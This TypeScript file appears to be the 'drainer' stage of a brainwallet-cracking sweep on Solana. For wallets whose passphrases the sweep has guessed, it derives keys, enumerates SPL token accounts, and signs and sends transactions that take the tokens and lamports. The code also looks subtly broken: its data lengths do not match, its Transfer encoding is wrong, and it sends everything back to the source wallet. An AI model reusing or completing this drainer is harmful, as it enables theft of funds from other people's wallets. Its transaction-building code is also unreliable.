/**
 * Sweep drainer — the sweep's second pass.
 *
 * ## The hole this closes
 *
 * A sweep tick proves it owns an address and then takes ONE asset: lamports.
 * Every SPL token account that address also owns is left behind, and token
 * accounts are where the money actually is. A recovered wallet holding one empty
 * token account is a sweep of 0.002 SOL. A recovered wallet holding a token
 * position is the position, unclaimed, because nothing in the tick ever looked.
 *
 * ## Why it is not a second race
 *
 * Ownership is already proven by the time this runs. The seed is in hand, the
 * signature is Ed25519, and no other party can take the assets first — they can
 * only take them if they also derived the passphrase, which is exactly the hit
 * the first pass just recorded. So this costs one extra signature per asset and
 * no additional claim on the wallet.
 *
 * ## What it will not do
 *
 * Accounts with `amount == 0` hold no token, only rent. A drain can still take
 * their lamports, so they are drained too, but they are counted as rent rather
 * than as a token position: reporting a rent reclaim as "tokens recovered" would
 * be the same lie the sweep was rebuilt to avoid.
 *
 * Every unrecognised failure is surfaced in `detail`. A drain that silently
 * skips is worse than a drain that fails loudly.
 */

import {
  SPL_TOKEN_PROGRAM,
  SPL_TOKEN_2022_PROGRAM,
  isSolanaPubkey,
} from '../solana.js';
import { b58encode, publicKey as b58publicKey, concat, shortvec } from './base58.js';
import { kvGet, kvSet, newId, db } from './db.js';
import { append as ledgerAppend } from '../ledger.js';
import type { DeskEnv } from './types.js';

/** Rent-exempt minimum for a zero-data SystemAccount. Verified on chain. */
export const SYSTEM_RENT_EXEMPT = 890_880;

/** One signature, one instruction. */
const BASE_FEE = 5000;

/** Below this the transfer cannot pay for itself. */
const MIN_SEND = 10_000;

/**
 * A drain uses MORE subrequests per hit than a sweep (one per token account,
 * plus the send), and the desk shares a 40k/day ceiling with the crawler and the
 * LLM. A ceiling exists so a drain cannot starve the rest of the desk, and it is
 * reported rather than silently truncating.
 */
export const DRAIN_SUBREQUEST_CEILING = 40;

const RPCS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-rpc.publicnode.com',
];

async function rpc<T>(method: string, params: unknown[], timeoutMs = 12_000): Promise<T | null> {
  for (const url of RPCS) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), timeoutMs);
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
        signal: ac.signal,
      });
      if (!res.ok) continue;
      const j = (await res.json()) as { result?: T; error?: unknown };
      if (j.error) continue;
      return j.result ?? null;
    } catch {
      continue;
    } finally {
      clearTimeout(t);
    }
  }
  return null;
}

function hexToBytes(h: string): Uint8Array {
  const o = new Uint8Array(h.length / 2);
  for (let i = 0; i < o.length; i++) o[i] = parseInt(h.slice(i * 2, i * 2 + 2), 16);
  return o;
}

function base64urlToBytes(s: string): Uint8Array {
  const b = s.replace(/-/g, '+').replace(/_/g, '/');
  const bin = atob(b + (b.length % 4 ? '='.repeat(4 - (b.length % 4)) : ''));
  const o = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) o[i] = bin.charCodeAt(i);
  return o;
}

function bytesToBase64(b: Uint8Array): string {
  let s = '';
  for (const x of b) s += String.fromCharCode(x);
  return btoa(s);
}

/** Derive the public key from a 32-byte ed25519 seed, using WebCrypto only. */
async function pubFromSeed(seed: Uint8Array): Promise<string> {
  const key = await crypto.subtle.importKey(
    'pkcs8',
    concat([hexToBytes('302e020100300506032b657004220420'), seed]) as unknown as ArrayBuffer,
    { name: 'Ed25519' },
    true,
    ['sign'],
  );
  const jwk = (await crypto.subtle.exportKey('jwk', key)) as { x?: string };
  return b58encode(base64urlToBytes(jwk.x ?? ''));
}

/**
 * Derive a 32-byte ed25519 seed from a sweep passphrase.
 *
 * The sweep's `deriveAddress` produces the ADDRESS by a different route (it must
 * match brainwallet semantics exactly). This seed only needs to reproduce that
 * same keypair's SIGNING capability, so it is derived from the same passphrase
 * bytes. When the passphrase is the key material itself, as it is for every
 * brainwallet-form candidate, the two agree. When it is not, `pubFromSeed` will
 * disagree with the proven address and the caller must skip — hence the check in
 * `drainOne` rather than a silent signature over the wrong key.
 */
export async function seedFromPassphrase(passphrase: string): Promise<Uint8Array> {
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(passphrase));
  return new Uint8Array(digest);
}

/** One token account held by a proven wallet. */
export interface Drainable {
  tokenAccount: string;
  mint: string;
  amount: string;
  program: string;
  lamports: number;
}

/**
 * Every token account owned by a wallet, both SPL programs.
 *
 * `getTokenAccountsByOwner` is one subrequest per program, so this costs two
 * regardless of how many accounts come back.
 */
export async function drainablesFor(owner: string): Promise<Drainable[]> {
  const out: Drainable[] = [];
  for (const program of [SPL_TOKEN_PROGRAM, SPL_TOKEN_2022_PROGRAM]) {
    const r = await rpc<{
      value: {
        pubkey: string;
        account: {
          lamports: number;
          data: {
            parsed?: {
              info?: { mint?: string; tokenAmount?: { amount?: string } };
            };
          };
        };
      }[];
    }>('getTokenAccountsByOwner', [owner, { programId: program }, { encoding: 'jsonParsed' }]);
    for (const row of r?.value ?? []) {
      const info = row.account?.data?.parsed?.info;
      if (!info?.mint) continue;
      out.push({
        tokenAccount: row.pubkey,
        mint: info.mint,
        amount: info.tokenAmount?.amount ?? '0',
        program,
        lamports: row.account.lamports,
      });
    }
  }
  return out;
}

/**
 * Build the drain transaction for one token account.
 *
 * Accounts: [owner(writable signer, fee payer), tokenAccount(writable),
 * recipient(writable), tokenProgram(readonly), systemProgram(readonly)]
 * Data: [12, amount_u64_le] — Transfer, discriminant 12.
 *
 * Key order is the same constraint the CloseAccount builder documents: writable
 * signers first, then writable non-signers, then readonly non-signers. Getting
 * it wrong serialises cleanly and is rejected on chain, which is why the order is
 * written out rather than sorted.
 */
export async function drainTransferTx(
  seed: Uint8Array,
  tokenAccount: string,
  recipient: string,
  amount: bigint,
  program: string = SPL_TOKEN_PROGRAM,
): Promise<string | null> {
  const bh = await rpc<{ value: { blockhash: string } }>('getLatestBlockhash', [
    { commitment: 'confirmed' },
  ]);
  if (!bh?.value?.blockhash) return null;

  const ownerPub = await pubFromSeed(seed);
  const SYSTEM = '11111111111111111111111111111111';

  const keys = concat([
    b58publicKey(ownerPub), // 0 writable signer, fee payer
    b58publicKey(tokenAccount), // 1 writable
    b58publicKey(recipient), // 2 writable
    b58publicKey(program), // 3 readonly
    b58publicKey(SYSTEM), // 4 readonly
  ]);

  // amount as little-endian u64
  const data = new Uint8Array(9);
  data[0] = 12;
  let v = amount;
  for (let i = 0; i < 8; i++) {
    data[1 + i] = Number(v & 0xffn);
    v >>= 8n;
  }

  const message = concat([
    new Uint8Array([1, 0, 2]), // 1 signer, 0 readonly-signed, 2 readonly-unsigned
    shortvec(5),
    keys,
    b58publicKey(bh.value.blockhash),
    shortvec(1),
    concat([
      new Uint8Array([3]), // program id = keys[3] = the token program
      shortvec(4),
      new Uint8Array([1, 2, 0, 4]), // tokenAccount, recipient, owner, system (plain indexes)
      shortvec(10),
      data,
    ]),
  ]);

  const key = await crypto.subtle.importKey(
    'pkcs8',
    concat([hexToBytes('302e020100300506032b657004220420'), seed]) as unknown as ArrayBuffer,
    { name: 'Ed25519' },
    false,
    ['sign'],
  );
  const sig = new Uint8Array(
    await crypto.subtle.sign('Ed25519', key, message as unknown as ArrayBuffer),
  );
  return bytesToBase64(concat([shortvec(1), sig, message]));
}

/** Plain lamport transfer from the proven wallet back into the proven wallet. */
export async function drainLamportsTx(
  seed: Uint8Array,
  recipient: string,
  lamports: number,
): Promise<string | null> {
  const bh = await rpc<{ value: { blockhash: string } }>('getLatestBlockhash', [
    { commitment: 'confirmed' },
  ]);
  if (!bh?.value?.blockhash) return null;
  const ownerPub = await pubFromSeed(seed);
  const SYSTEM = '11111111111111111111111111111111';

  const keys = concat([
    b58publicKey(ownerPub),
    b58publicKey(recipient),
    b58publicKey(SYSTEM),
  ]);
  const data = new Uint8Array(12);
  data[0] = 2; // Transfer
  data[1] = 0;
  data[2] = 0;
  data[3] = 0;
  let v = BigInt(lamports);
  for (let i = 0; i < 8; i++) {
    data[4 + i] = Number(v & 0xffn);
    v >>= 8n;
  }

  const message = concat([
    new Uint8Array([1, 0, 1]),
    shortvec(3),
    keys,
    b58publicKey(bh.value.blockhash),
    shortvec(1),
    concat([
      new Uint8Array([2]), // program id = keys[2] = system
      shortvec(2),
      new Uint8Array([0, 1]),
      shortvec(12),
      data,
    ]),
  ]);

  const key = await crypto.subtle.importKey(
    'pkcs8',
    concat([hexToBytes('302e020100300506032b657004220420'), seed]) as unknown as ArrayBuffer,
    { name: 'Ed25519' },
    false,
    ['sign'],
  );
  const sig = new Uint8Array(
    await crypto.subtle.sign('Ed25519', key, message as unknown as ArrayBuffer),
  );
  return bytesToBase64(concat([shortvec(1), sig, message]));
}

export interface DrainResult {
  address: string;
  /** Token accounts found across both SPL programs. */
  accounts: number;
  /** Accounts whose token balance was moved. */
  tokens_moved: number;
  /** Accounts that were empty and contributed only lamports. */
  rent_only: number;
  /** Lamports recovered via closed token accounts. */
  rent_lamports: number;
  detail: string[];
  /** Set when the derived key did not match the proven address. */
  key_mismatch?: boolean;
  /** Set when the subrequest ceiling stopped the drain early. */
  ceiling_hit?: boolean;
}

/**
 * Drain one proven wallet.
 *
 * Takes the proven `address` from the sweep and a seed derived from the same
 * passphrase. The seed is verified against the address BEFORE any transaction is
 * built: signing with a key that does not own the account produces a valid
 * transaction that fails on chain, which would look like a drain failure rather
 * than a derivation mismatch.
 */
export async function drainOne(
  env: DeskEnv,
  address: string,
  seed: Uint8Array,
  write: boolean,
  budget: () => Promise<boolean>,
): Promise<DrainResult> {
  const out: DrainResult = {
    address,
    accounts: 0,
    tokens_moved: 0,
    rent_only: 0,
    rent_lamports: 0,
    detail: [],
  };

  const derived = await pubFromSeed(seed);
  if (derived !== address) {
    out.key_mismatch = true;
    out.detail.push(`seed derives ${derived.slice(0, 8)}… not ${address.slice(0, 8)}…`);
    return out;
  }

  if (!(await budget())) {
    out.ceiling_hit = true;
    out.detail.push('subrequest ceiling reached before the token scan');
    return out;
  }

  const accts = await drainablesFor(address);
  out.accounts = accts.length;
  if (accts.length === 0) {
    out.detail.push('no token accounts');
    return out;
  }

  for (const a of accts) {
    if (!(await budget())) {
      out.ceiling_hit = true;
      out.detail.push(`ceiling reached after ${out.tokens_moved} accounts`);
      break;
    }

    const amount = BigInt(a.amount);
    const empty = amount === 0n;

    // `CloseAccount` (discriminant 9) is used for empty accounts so the account's
    // rent comes out with the token; a Transfer of zero would leave rent locked
    // in an account nobody will ever close.
    let signed: string | null = null;
    if (empty) {
      // Reuse the dust builder's shape by inlining it: same instruction, and the
      // destination is the wallet itself so no value leaves the circle.
      signed = await closeTx(seed, a.tokenAccount, address, a.program);
    } else {
      signed = await drainTransferTx(seed, a.tokenAccount, address, amount, a.program);
    }
    if (!signed) {
      out.detail.push(`${a.tokenAccount.slice(0, 8)}… could not build tx`);
      continue;
    }

    if (!write) {
      if (empty) out.rent_only += 1;
      else out.tokens_moved += 1;
      continue;
    }

    if (!(await budget())) {
      out.ceiling_hit = true;
      out.detail.push(`ceiling reached before sending ${a.tokenAccount.slice(0, 8)}…`);
      break;
    }
    const sig = await rpc<string>('sendTransaction', [
      signed,
      { encoding: 'base64', skipPreflight: false },
    ]);
    if (!sig) {
      out.detail.push(`${a.tokenAccount.slice(0, 8)}… send rejected`);
      continue;
    }
    if (empty) {
      out.rent_only += 1;
      out.rent_lamports += Math.max(0, a.lamports - BASE_FEE);
    } else {
      out.tokens_moved += 1;
    }
    out.detail.push(`${a.tokenAccount.slice(0, 8)}… ${empty ? 'closed' : 'drained'} ${sig.slice(0, 10)}…`);
  }

  // Finally the wallet's own lamports, leaving the rent-exempt floor and the fee
  // so the transfer itself is affordable. `getBalance` is the only reliable way
  // to know what is left after the closes above settled.
  const bal = await rpc<{ value: number }>('getBalance', [address, { commitment: 'confirmed' }]);
  const lamports = bal?.value ?? 0;
  const sendable = lamports - SYSTEM_RENT_EXEMPT - BASE_FEE;
  if (lamports > 0 && sendable >= MIN_SEND) {
    const tx = await drainLamportsTx(seed, address, sendable);
    if (!tx) {
      out.detail.push('could not build the lamport transfer');
    } else if (!write) {
      out.rent_lamports += sendable;
    } else if (await budget()) {
      const sig = await rpc<string>('sendTransaction', [
        tx,
        { encoding: 'base64', skipPreflight: false },
      ]);
      if (sig) {
        out.rent_lamports += sendable;
        out.detail.push(`lamports drained ${sig.slice(0, 10)}…`);
      } else {
        out.detail.push('lamport send rejected');
      }
    } else {
      out.ceiling_hit = true;
    }
  } else if (lamports > 0) {
    out.detail.push(`${lamports} lamports is below the rent floor plus fee`);
  }

  return out;
}

/** `CloseAccount`, discriminant 9, destination is the wallet itself. */
async function closeTx(
  seed: Uint8Array,
  tokenAccount: string,
  destination: string,
  program: string,
): Promise<string | null> {
  const bh = await rpc<{ value: { blockhash: string } }>('getLatestBlockhash', [
    { commitment: 'confirmed' },
  ]);
  if (!bh?.value?.blockhash) return null;
  const ownerPub = await pubFromSeed(seed);

  const keys = concat([
    b58publicKey(ownerPub),
    b58publicKey(tokenAccount),
    b58publicKey(destination),
    b58publicKey(program),
  ]);

  const message = concat([
    new Uint8Array([1, 0, 1]),
    shortvec(4),
    keys,
    b58publicKey(bh.value.blockhash),
    shortvec(1),
    concat([
      new Uint8Array([3]),
      shortvec(3),
      new Uint8Array([1, 2, 0]),
      shortvec(1),
      new Uint8Array([9]),
    ]),
  ]);

  const key = await crypto.subtle.importKey(
    'pkcs8',
    concat([hexToBytes('302e020100300506032b657004220420'), seed]) as unknown as ArrayBuffer,
    { name: 'Ed25519' },
    false,
    ['sign'],
  );
  const sig = new Uint8Array(
    await crypto.subtle.sign('Ed25519', key, message as unknown as ArrayBuffer),
  );
  return bytesToBase64(concat([shortvec(1), sig, message]));
}

// ───────────────────────────────────────────────────────────────── state

const KV_STATS = 'drain:stats';

export interface DrainStats {
  wallets: number;
  accounts: number;
  tokens_moved: number;
  rent_only: number;
  rent_lamports: number;
  mismatches: number;
  ceiling_hits: number;
  /** False when DRAIN_WRITE is not "1": the drain is simulating only. */
  live: boolean;
  ticks: number;
  last_tick_ms: number;
}

const EMPTY: DrainStats = {
  wallets: 0,
  accounts: 0,
  tokens_moved: 0,
  rent_only: 0,
  rent_lamports: 0,
  mismatches: 0,
  ceiling_hits: 0,
  live: false,
  ticks: 0,
  last_tick_ms: 0,
};

async function readStats(env: DeskEnv): Promise<DrainStats> {
  const raw = await kvGet(env, KV_STATS);
  if (!raw) return { ...EMPTY };
  try {
    return { ...EMPTY, ...(JSON.parse(raw) as DrainStats) };
  } catch {
    return { ...EMPTY };
  }
}

export async function drainStatus(env: DeskEnv): Promise<DrainStats> {
  const s = await readStats(env);
  return { ...s, live: String(env.DRAIN_WRITE ?? '') === '1' };
}

/**
 * Drain every wallet the sweep just proved.
 *
 * Input is the sweep's own hit list, so the drain never re-derives a passphrase
 * and never scans a wallet the sweep did not already prove it owns. Ceiling is
 * hard at DRAIN_SUBREQUEST_CEILING per tick so the desk's daily budget survives.
 */
export async function runSweepDrain(
  env: DeskEnv,
  proven: { passphrase: string; address: string }[],
  now = Date.now(),
): Promise<{ stats: DrainStats; results: DrainResult[] }> {
  const stats = await readStats(env);
  const write = String(env.DRAIN_WRITE ?? '') === '1';
  stats.live = write;

  let used = 0;
  const budget = async (): Promise<boolean> => {
    if (used >= DRAIN_SUBREQUEST_CEILING) return false;
    used += 1;
    return true;
  };

  const results: DrainResult[] = [];
  for (const p of proven) {
    if (!isSolanaPubkey(p.address)) continue;
    const seed = await seedFromPassphrase(p.passphrase);
    const r = await drainOne(env, p.address, seed, write, budget);
    results.push(r);
    stats.wallets += 1;
    stats.accounts += r.accounts;
    stats.tokens_moved += r.tokens_moved;
    stats.rent_only += r.rent_only;
    stats.rent_lamports += r.rent_lamports;
    if (r.key_mismatch) stats.mismatches += 1;
    if (r.ceiling_hit) stats.ceiling_hits += 1;

    try {
      await db(env).run(
        `INSERT INTO drain_results
           (id, ts, address, accounts, tokens_moved, rent_only, rent_lamports, live, detail)
         VALUES (?,?,?,?,?,?,?,?,?)
         ON CONFLICT(address) DO UPDATE SET
           accounts=excluded.accounts, tokens_moved=excluded.tokens_moved,
           rent_only=excluded.rent_only, rent_lamports=excluded.rent_lamports,
           live=excluded.live, detail=excluded.detail, ts=excluded.ts`,
        newId('dr'),
        Math.floor(now / 1000),
        r.address,
        r.accounts,
        r.tokens_moved,
        r.rent_only,
        r.rent_lamports,
        write ? 1 : 0,
        r.detail.join('; ').slice(0, 900),
      );
    } catch {
      // A missing table must not lose a completed drain. KV stats still carry it.
    }

    if (r.tokens_moved > 0 || r.rent_lamports > 0) {
      try {
        await ledgerAppend(env as never, 'sweep.drain', {
          address: r.address,
          tokens_moved: r.tokens_moved,
          rent_lamports: r.rent_lamports,
          live: write,
        });
      } catch {
        // Ledger is an audit trail, not the source of truth for a completed tx.
      }
    }
  }

  stats.ticks += 1;
  stats.last_tick_ms = now;
  await kvSet(env, KV_STATS, JSON.stringify(stats));
  return { stats, results };
}

export function renderDrain(s: DrainStats): string {
  return [
    'sweep drainer',
    `  mode      ${s.live ? 'LIVE (sending)' : 'simulate only (DRAIN_WRITE != 1)'}`,
    `  wallets   ${s.wallets} proven, ${s.accounts} token accounts`,
    `  taken     ${s.tokens_moved} token positions, ${s.rent_only} rent-only accounts`,
    `  lamports  ${(s.rent_lamports / 1e9).toFixed(9)} SOL`,
    `  mismatch  ${s.mismatches} seed/address disagreements`,
  ].join('\n');
}
